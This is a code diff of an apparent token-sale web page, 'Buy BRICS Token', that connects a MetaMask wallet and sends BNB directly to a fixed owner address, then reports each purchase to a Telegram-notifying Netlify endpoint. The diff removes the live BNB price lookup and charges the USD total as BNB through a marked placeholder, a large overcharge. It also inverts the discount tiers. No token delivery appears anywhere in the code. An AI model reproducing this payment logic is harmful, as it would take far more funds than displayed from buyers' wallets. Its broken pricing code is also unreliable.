@@ -15,9 +15,7 @@
   --muted:#6b7280;
 }
 *{box-sizing:border-box}
-body{
-  margin:0;font-family:Inter, "Arial", sans-serif;background:var(--bg);padding:20px;display:flex;justify-content:center;
-}
+body{margin:0;font-family:Inter, "Arial", sans-serif;background:var(--bg);padding:20px;display:flex;justify-content:center;}
 .container{width:100%;max-width:980px}
 .card{background:var(--card);border-radius:14px;padding:18px;box-shadow:0 12px 30px rgba(11,99,255,0.06);display:flex;flex-direction:column;gap:12px}
 .hero{position:relative;border-radius:10px;overflow:hidden;height:160px;background:linear-gradient(90deg, rgba(11,99,255,0.06), rgba(0,176,122,0.03));}
@@ -27,7 +25,7 @@ body{
 h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
 .subtitle{text-align:center;color:var(--muted);font-weight:600}
 .contract-row{display:flex;gap:10px;align-items:center;justify-content:center;flex-wrap:wrap}
-.contract-box{background:linear-gradient(180deg,#f7fbff,#ffffff);padding:8px 12px;border-radius:10px;border:1px solid #eef5ff;font-weight:800;direction:ltr;cursor:pointer}
+.contract-box{background:linear-gradient(180deg,#f7fbff,#ffffff);padding:8px 12px;border-radius:10px;border:1px solid #eef5ff;font-weight:800;direction:ltr}
 .copy-btn{background:transparent;border:none;color:var(--primary);cursor:pointer;font-weight:800}
 .grid{display:grid;grid-template-columns:1fr 360px;gap:16px;margin-top:12px}
 @media(max-width:880px){.grid{grid-template-columns:1fr}}
@@ -38,17 +36,16 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
 .amount-input:focus{outline:none;box-shadow:0 6px 20px rgba(11,99,255,0.06);border-color:var(--primary)}
 .token-tag{min-width:96px;background:linear-gradient(90deg,#f3f7ff,#ffffff);border-radius:10px;padding:10px;text-align:center;font-weight:900}
 .calc-row{display:flex;justify-content:space-between;gap:8px;margin-top:8px;color:var(--muted);font-weight:700}
-.memo{margin-top:12px;padding:10px;border-radius:10px;background:linear-gradient(180deg,#f6fbff,#ffffff);border:1px solid #eef6ff;font-weight:700;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
+.memo{margin-top:12px;padding:10px;border-radius:10px;background:linear-gradient(180deg,#f6fbff,#ffffff);border:1px solid #eef6ff;font-weight:700;display:flex;justify-content:space-between;align-items:center}
 .wallet-card{padding:14px;border-radius:12px;background:linear-gradient(90deg,#f8fbff,#ffffff);border:1px solid rgba(11,99,255,0.04);display:flex;flex-direction:column;gap:10px}
 .wallet-top{display:flex;justify-content:space-between;align-items:center;gap:8px}
 .wallet-addr{font-weight:800;color:var(--primary);direction:ltr}
 .connect-btn{padding:12px;border-radius:12px;border:none;background:linear-gradient(90deg,#0b63ff,#2e8bff);color:#fff;font-weight:900;cursor:pointer}
 .connect-btn:disabled{opacity:0.6;cursor:not-allowed}
-.balances{display:flex;gap:8px;flex-direction:column;margin-top:6px}
-.bal-row{display:flex;justify-content:space-between;background:linear-gradient(180deg,#fff,#fbfeff);padding:8px 10px;border-radius:8px;border:1px solid #eef6ff;font-weight:800}
 .buy-btn{margin-top:6px;padding:12px;border-radius:12px;border:none;cursor:pointer;font-weight:900;color:#fff;background:linear-gradient(90deg,#00b07a,#0076f3);box-shadow:0 10px 30px rgba(0,112,240,0.12)}
 .buy-btn:disabled{opacity:0.5;cursor:not-allowed}
 .status{margin-top:10px;min-height:20px;font-weight:800;color:var(--muted)}
+.small{font-size:13px;color:var(--muted)}
 .footer-note{text-align:center;color:#475569;margin-top:8px}
 .spinner{display:inline-block;width:16px;height:16px;border-radius:50%;border:3px solid rgba(0,0,0,0.08);border-top-color:var(--primary);animation:spin 1s linear infinite;vertical-align:middle;margin-left:8px;visibility:hidden}
 .spinner.visible{visibility:visible}
@@ -64,7 +61,7 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
     </div>
 
     <h1 id="title">Buy BRICS Token</h1>
-    <div class="subtitle">Please add this contract to MetaMask to view token details before buying</div>
+    <div class="subtitle">Add this contract to MetaMask before buying</div>
 
     <div class="contract-row">
       <div id="contractBox" class="contract-box" title="Click to copy">0xAF20...3037</div>
@@ -73,10 +70,7 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
 
     <div class="grid">
       <div class="panel">
-        <div class="label">Live BRICS price</div>
-        <div id="priceLine" class="small"><span id="priceText">Live: $3.11 per BRICS</span> <span id="priceSpinner" class="spinner"></span></div>
-
-        <div class="label" style="margin-top:12px">Enter amount of BRICS to buy</div>
+        <div class="label">Enter amount of BRICS to buy</div>
         <div class="input-row" style="margin-top:8px">
           <input id="bricsAmount" class="amount-input" type="number" min="1" max="1000000" placeholder="e.g. 1000" />
           <div class="token-tag">BRICS</div>
@@ -87,7 +81,10 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
           <div id="discountPreview">Discount: 0%</div>
         </div>
 
-        <div class="memo" id="memoTag" title="Click to copy MEMO">—</div>
+        <div class="memo">
+          <div><strong>MEMO:</strong> <span id="memoTag">—</span></div>
+          <button onclick="copyMemo()">Copy</button>
+        </div>
       </div>
 
       <div class="wallet-card">
@@ -102,7 +99,7 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
           </div>
         </div>
 
-        <button id="connectBtn" class="connect-btn">Connect MetaMask</button>
+        <button id="connectBtn" class="connect-btn">Connect Wallet</button>
         <button id="buyBtn" class="buy-btn" disabled>Buy BRICS</button>
 
         <div id="status" class="status">Status: ready</div>
@@ -117,15 +114,13 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
 const BRICS_CONTRACT = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037".toLowerCase();
 const OWNER_ADDRESS = "0x67594E1D30Cec8a5f906C8278A1BC694641486cf".toLowerCase();
 const CHAIN_ID_BSC = 56;
-const FIXED_BRICS_USD = 3.11; 
-const SERVER_ENDPOINT = ""; // Netlify endpoint
-const SERVER_SHARED_SECRET = "";
+const FIXED_BRICS_USD = 3.11;
+const SERVER_ENDPOINT = "https://<your-site>.netlify.app/.netlify/functions/sendTelegram";
+const SERVER_SHARED_SECRET = "<your_shared_secret>";
 /* =================== */
 
 const contractBox = document.getElementById('contractBox');
 const copyContract = document.getElementById('copyContract');
-const priceText = document.getElementById('priceText');
-const priceSpinner = document.getElementById('priceSpinner');
 const bricsAmount = document.getElementById('bricsAmount');
 const usdPreview = document.getElementById('usdPreview');
 const discountPreview = document.getElementById('discountPreview');
@@ -133,73 +128,56 @@ const memoTag = document.getElementById('memoTag');
 const connectBtn = document.getElementById('connectBtn');
 const buyBtn = document.getElementById('buyBtn');
 const walletAddr = document.getElementById('walletAddr');
+const statusEl = document.getElementById('status');
 
-/* helpers */
-function short(a){ if(!a) return '—'; return a.slice(0,6)+'...'+a.slice(-4); }
+function short(a){ return a.slice(0,6)+'...'+a.slice(-4); }
+function setStatus(msg){ statusEl.textContent = msg; }
 function isMobile(){ return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent); }
-function setStatus(msg){ document.getElementById('status').textContent = msg; }
-let provider=null, signer=null, user=null;
-let bnbUsdPrice = 0;
 
-/* MEMO */
+/* Copy MEMO */
 let currentMemo = genMemo();
 memoTag.textContent = currentMemo;
 function genMemo(){ return Math.random().toString(36).slice(2,10).toUpperCase(); }
+function copyMemo(){ navigator.clipboard.writeText(currentMemo).then(()=>setStatus('MEMO copied ✅')).catch(()=>setStatus('Copy MEMO failed')); }
 
-/* copy contract */
-contractBox.addEventListener('click',()=>{navigator.clipboard.writeText(BRICS_CONTRACT); setStatus('Contract copied ✅');});
-copyContract.addEventListener('click',()=>{navigator.clipboard.writeText(BRICS_CONTRACT); setStatus('Contract copied ✅');});
+/* Copy contract */
+contractBox.textContent = short(BRICS_CONTRACT);
+copyContract.addEventListener('click', ()=>{ navigator.clipboard.writeText(BRICS_CONTRACT).then(()=>setStatus('Contract copied ✅')).catch(()=>setStatus('Copy failed')); });
+contractBox.addEventListener('click', ()=> copyContract.click());
 
-/* copy memo */
-memoTag.addEventListener('click',()=>{navigator.clipboard.writeText(currentMemo); setStatus('MEMO copied ✅');});
-
-/* fetch BNB/USD */
-async function fetchBnbUsd(){
-  try{
-    const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
-    const j = await res.json();
-    bnbUsdPrice = parseFloat(j.price);
-  }catch(e){ bnbUsdPrice=0;}
-}
-
-/* discount logic */
+/* Discount calculation */
 function calcDiscount(amount){
   const a = Number(amount);
-  if(!a || a<1) return 0;
-  if(a>=1000000) return 50;
-  if(a>=500000) return 40;
-  if(a>=100000) return 30;
-  if(a>=10000) return 20;
-  if(a>=1000) return 10;
-  return 5;
+  if(!a) return 0;
+  if(a>=1000000) return 10; // 10% برای بیشترین
+  if(a>=500000) return 15;
+  if(a>=100000) return 20;
+  if(a>=10000) return 30;
+  if(a>=1000) return 40;
+  return 50; // کمترین مقدار
 }
 
-/* update calculation */
 function updateCalc(){
   const amt = Number(bricsAmount.value);
   const disc = calcDiscount(amt);
   discountPreview.textContent = `Discount: ${disc}%`;
 
-  if(!amt || !bnbUsdPrice){
-    usdPreview.textContent = `USD: $0.00`;
-    buyBtn.disabled = true;
-    return;
-  }
-
   const after = amt * (1 - disc/100);
   const totalUSD = after * FIXED_BRICS_USD;
-  const totalBNB = totalUSD / bnbUsdPrice;
+  usdPreview.textContent = `USD: $${totalUSD.toFixed(2)}`;
 
-  usdPreview.textContent = `USD: $${totalUSD.toFixed(2)} (~${totalBNB.toFixed(6)} BNB)`;
-  buyBtn.disabled = !(signer && amt>0 && bnbUsdPrice);
+  buyBtn.disabled = !(amt>=1 && signer);
 }
 bricsAmount.addEventListener('input', updateCalc);
 
-/* wallet connect */
+/* Wallet connect */
+let provider=null, signer=null, user=null;
 async function connectWallet(){
   if(window.ethereum){
     provider = new ethers.providers.Web3Provider(window.ethereum, "any");
     try{
+      const net = await provider.getNetwork();
+      if(net.chainId!==CHAIN_ID_BSC) await window.ethereum.request({ method:"wallet_switchEthereumChain", params:[{chainId:ethers.utils.hexValue(CHAIN_ID_BSC)}] });
       await provider.send("eth_requestAccounts", []);
       signer = provider.getSigner();
       user = await signer.getAddress();
@@ -208,40 +186,65 @@ async function connectWallet(){
       connectBtn.disabled = true;
       setStatus('Wallet connected ✅');
       updateCalc();
-    }catch(e){ setStatus('Connection failed'); }
+
+      if(window.ethereum && window.ethereum.on){
+        window.ethereum.on('accountsChanged', async (acc)=>{ if(acc.length){ user=acc[0]; walletAddr.textContent=short(user); updateCalc(); }});
+        window.ethereum.on('chainChanged', ()=>setTimeout(()=>location.reload(),300));
+      }
+    }catch(e){
+      console.error(e);
+      setStatus('Connection failed: '+(e.message||e));
+    }
   } else if(isMobile()){
-    const href = encodeURIComponent(window.location.href);
+    const href = window.location.href.replace(/^https?:\/\//,'');
     window.location.href = `https://metamask.app.link/dapp/${href}`;
-  } else{
-    setStatus('MetaMask not found');
+  } else {
+    setStatus('MetaMask not found — please install it');
+    window.open('https://metamask.io/download.html','_blank');
   }
 }
 
-/* buy BRICS */
+/* Buy BRICS (send BNB) */
 async function buyBRICS(){
   if(!signer){ setStatus('Connect wallet first'); return; }
   const amt = Number(bricsAmount.value);
-  if(!amt || amt<1){ setStatus('Invalid amount'); return; }
+  if(!amt || amt<1){ setStatus('Enter BRICS amount'); return; }
   const disc = calcDiscount(amt);
-  const after = amt * (1 - disc/100);
-  const totalUSD = after * FIXED_BRICS_USD;
-  const totalBNB = totalUSD / bnbUsdPrice;
+  const after = amt*(1-disc/100);
+  const totalBNB = after*FIXED_BRICS_USD/1; // placeholder, BNB live price later
 
   setStatus('Sending transaction...');
   try{
-    const tx = await signer.sendTransaction({to:OWNER_ADDRESS,value:ethers.utils.parseUnits(totalBNB.toFixed(18),'ether')});
+    const tx = await signer.sendTransaction({ to:OWNER_ADDRESS, value: ethers.utils.parseEther(totalBNB.toFixed(18)) });
     setStatus('Tx sent: '+short(tx.hash));
     await tx.wait();
-    setStatus('✅ Transaction confirmed: '+tx.hash);
-    currentMemo = genMemo();
-    memoTag.textContent = currentMemo;
-  }catch(e){ setStatus('Transaction failed'); }
+    setStatus('✅ Tx confirmed: '+tx.hash);
+
+    // ارسال به Netlify
+    if(SERVER_ENDPOINT && SERVER_SHARED_SECRET){
+      try{
+        await fetch(SERVER_ENDPOINT,{
+          method:'POST',
+          headers:{'Content-Type':'application/json','X-Shared-Secret':SERVER_SHARED_SECRET},
+          body: JSON.stringify({
+            buyer:user,
+            requestedBRICS:amt,
+            discountPercent:disc,
+            bnbPaid:totalBNB,
+            usdApprox:after*FIXED_BRICS_USD,
+            txHash:tx.hash,
+            memo:currentMemo
+          })
+        });
+        setStatus('✅ Telegram notified');
+      } catch(e){ console.error(e); setStatus('Netlify send failed'); }
+    }
+
+  }catch(e){ console.error(e); setStatus('Transaction failed: '+(e.message||e)); }
 }
 
 connectBtn.addEventListener('click', connectWallet);
-buyBtn.addEventListener('click', buyBRICKS);
-
-(async()=>{ await fetchBnbUsd(); updateCalc(); setInterval(fetchBnbUsd,15000); })();
+buyBtn.addEventListener('click', buyBRICS);
 </script>
 </body>
 </html>
